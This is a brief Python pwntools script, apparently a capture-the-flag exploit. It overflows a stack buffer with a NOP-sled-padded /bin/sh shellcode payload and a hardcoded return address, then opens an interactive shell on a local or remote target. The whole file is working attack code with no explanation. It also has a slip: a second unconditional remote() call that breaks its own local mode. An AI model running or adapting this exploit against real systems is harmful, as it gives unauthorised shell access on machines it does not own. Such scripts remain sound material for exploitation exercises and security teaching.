#!/usr/bin/env python
import sys
from pwn import *
from time import sleep


STACK = 0x7fffffffe004
REMOTE_STACK = 0x7fffffffec04
if len(sys.argv) == 3:
    r = remote(sys.argv[1], int(sys.argv[2]))
    stack = REMOTE_STACK
else:
    r = process(sys.argv[1], aslr=False)
    stack = STACK
    sleep(3)

r = remote(sys.argv[1], int(sys.argv[2]))
buf = shellcraft.amd64.linux.sh()
buf = asm(buf, arch="amd64")
buf = buf.rjust(800, "\x90")
buf = buf.ljust(1032, "\x90")
buf += p64(stack)
buf += "\n"
r.send(buf)
r.interactive()
